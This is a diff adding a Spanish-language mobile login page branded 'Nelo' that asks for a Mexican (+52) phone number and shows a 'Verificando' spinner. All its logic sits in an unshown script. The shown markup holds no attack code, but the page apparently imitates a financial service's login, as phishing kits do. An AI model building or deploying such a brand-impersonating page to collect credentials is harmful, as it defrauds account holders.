@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Acceso Móvil | Nelo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .body-fondo {
+      background-color: #067BF2;  
+      min-height: 100vh;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    .app-movil {
+      width: 100%;
+      max-width: 360px;      
+      margin: 0 auto;
+    }
+
+    .card-alargado {
+      background-color: white;
+      border-radius: 44px;
+      padding: 56px 24px 64px 24px;
+      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.35), 0 0 0 1px rgba(0,0,0,0.02);
+      transition: transform 0.2s ease;
+      width: 100%;
+    }
+
+    .contenido-vertical {
+      display: flex;
+      flex-direction: column;
+      gap: 32px;             
+    }
+ 
+    .welcome-block {
+      display: block;
+      font-size: 1.9rem;
+      font-weight: normal;    
+      letter-spacing: -0.02em;
+      text-align: center;
+      color: #0A2540;
+      line-height: 1.3;
+      margin-bottom: 4px;
+    }
+
+    .logo-original-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0;
+    }
+
+    .logo-sin-marco {
+      display: block;
+      max-width: 100%;       
+      height: auto;
+      width: auto;           
+      background: none;
+      box-shadow: none;
+      border: none;
+      object-fit: contain;
+      transform: scale(0.6);    
+      transition: transform 0.1s ease;
+    }
+
+    .phone-label-block {
+      display: block;
+      font-weight: 600;
+      font-size: 0.95rem;
+      color: #1F2A44;
+      margin-bottom: 12px;
+      letter-spacing: -0.2px;
+    }
+
+    .phone-group {
+      margin-top: 4px;
+    }
+
+    .input-prefix-wrapper {
+      display: flex;
+      align-items: center;
+      background-color: #F8FAFE;
+      border-radius: 80px;
+      border: 1.5px solid #E2EDF2;
+      transition: all 0.2s ease;
+      overflow: hidden;
+    }
+
+    .input-prefix-wrapper:focus-within {
+      border-color: #067BF2;
+      box-shadow: 0 0 0 3px rgba(6, 123, 242, 0.25);
+      background-color: white;
+    }
+
+    .prefix-fijo {
+      background-color: #F8FAFE;
+      padding: 0 18px;
+      font-size: 1rem;
+      font-weight: 600;
+      color: #0F2B3D;
+      border-right: 1.5px solid #DCE5EC;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'SF Mono', monospace;
+      letter-spacing: 0.3px;
+    }
+
+    .input-prefix-wrapper:focus-within .prefix-fijo {
+      background-color: white;
+    }
+
+    .numero-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      background: transparent;
+      padding: 0 16px;
+      font-size: 0.98rem;
+      height: 56px;
+      font-weight: 500;
+      color: #0A1C2F;
+      font-family: inherit;
+    }
+
+    .numero-input::placeholder {
+      color: #9AAEBF;
+      font-weight: 450;
+      font-size: 0.9rem;
+    }
+
+    .btn-continuar {
+      background-color: #067BF2;  
+      width: 100%;
+      border: none;
+      border-radius: 80px;
+      padding: 18px 0;
+      font-size: 1.08rem;
+      font-weight: 700;
+      color: white;
+      transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 8px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.12);
+    }
+
+    .btn-continuar:active {
+      transform: scale(0.97);
+      background-color: #055fc9;   
+    }
+
+    .btn-continuar:disabled {
+      background-color: #8CBAF0;
+      transform: none;
+      cursor: not-allowed;
+    }
+
+    .feedback-area {
+      margin-top: 18px;
+      text-align: center;
+    }
+
+    .feedback-msg {
+      display: inline-block;
+      font-size: 0.78rem;
+      font-weight: 500;
+      padding: 8px 16px;
+      border-radius: 60px;
+      background-color: #F1F5F9;
+      color: #1E293B;
+      transition: all 0.2s;
+    }
+
+    .error-fb {
+      background-color: #FFECEC;
+      color: #C62828;
+    }
+
+    .success-fb {
+      background-color: #E0F7FA;
+      color: #067BF2;
+    }
+
+    /* Modal Spinner */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(3px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.2s, opacity 0.2s ease;
+    }
+
+    .modal-overlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .modal-container {
+      background-color: white;
+      border-radius: 44px;
+      width: 280px;
+      max-width: 80%;
+      padding: 32px 24px;
+      text-align: center;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.3);
+      animation: modalFadeIn 0.2s ease-out;
+    }
+
+    @keyframes modalFadeIn {
+      from {
+        transform: scale(0.95);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    .spinner-azul-modal {
+      display: inline-block;
+      width: 48px;
+      height: 48px;
+      border: 4px solid rgba(6, 123, 242, 0.2);
+      border-radius: 50%;
+      border-top-color: #067BF2;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .modal-mensaje {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #0A2540;
+      margin-bottom: 8px;
+    }
+
+    .modal-submensaje {
+      font-size: 0.85rem;
+      color: #5A7B9C;
+      font-weight: 500;
+    }
+
+    @media (max-width: 450px) {
+      .body-fondo {
+        padding: 20px 12px;
+      }
+      .app-movil {
+        max-width: 340px;     
+      }
+      .card-alargado {
+        padding: 48px 20px 56px 20px; 
+        border-radius: 38px;
+      }
+      .welcome-block {
+        font-size: 1.7rem;
+      }
+      .prefix-fijo {
+        padding: 0 14px;
+        height: 52px;
+        font-size: 0.95rem;
+      }
+      .numero-input {
+        height: 52px;
+        font-size: 0.92rem;
+      }
+      .btn-continuar {
+        padding: 16px 0;
+        font-size: 1rem;
+      }
+      .contenido-vertical {
+        gap: 28px;
+      }
+      .logo-sin-marco {
+        transform: scale(0.6);
+      }
+      .modal-container {
+        width: 260px;
+        padding: 28px 20px;
+      }
+      .spinner-azul-modal {
+        width: 42px;
+        height: 42px;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .card-alargado {
+        padding: 42px 16px 50px 16px;
+      }
+      .welcome-block {
+        font-size: 1.55rem;
+      }
+      .prefix-fijo {
+        padding: 0 12px;
+      }
+      .phone-label-block {
+        font-size: 0.85rem;
+      }
+    }
+
+    @media (min-width: 600px) {
+      .app-movil {
+        max-width: 380px;    
+      }
+      .card-alargado {
+        padding: 60px 28px 68px 28px; 
+      }
+    }
+
+    @media (min-width: 1024px) {
+      .app-movil {
+        max-width: 390px;
+      }
+      .card-alargado {
+        padding: 64px 30px 72px 30px;
+      }
+    }
+  </style>
+</head>
+<body class="body-fondo">
+  <div class="app-movil">
+    <div class="card-alargado">
+      <div class="contenido-vertical">
+        <span class="welcome-block">¡Bienvenido de nuevo!</span>
+
+        <div class="logo-original-container">
+          <img class="logo-sin-marco" src="img/logo.jpeg" alt="Logo original" 
+               onerror="this.onerror=null; this.src='https://placehold.co/400x200?text=Logo&bg=f0f0f0'; this.style.transform='scale(0.6)'">
+        </div>
+
+        <div class="phone-group">
+          <span class="phone-label-block">Ingresa tu número de teléfono</span>
+          
+          <div class="input-prefix-wrapper">
+            <span class="prefix-fijo">+52</span>
+            <input type="tel" id="telefonoMovil" class="numero-input" 
+                   placeholder="55 1234 5678" inputmode="numeric" autocomplete="tel">
+          </div>
+        </div>
+
+        <button class="btn-continuar" id="continuarAccion">Continuar →</button>
+
+        <div class="feedback-area">
+          <span id="feedbackSpan" class="feedback-msg"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="spinnerModal" class="modal-overlay">
+    <div class="modal-container">
+      <div class="spinner-azul-modal"></div>
+      <div class="modal-mensaje">Verificando</div>
+      <div class="modal-submensaje">por favor espere...</div>
+    </div>
+  </div>
+
+  <script src="js/index.js"></script>
+</body>
+</html>
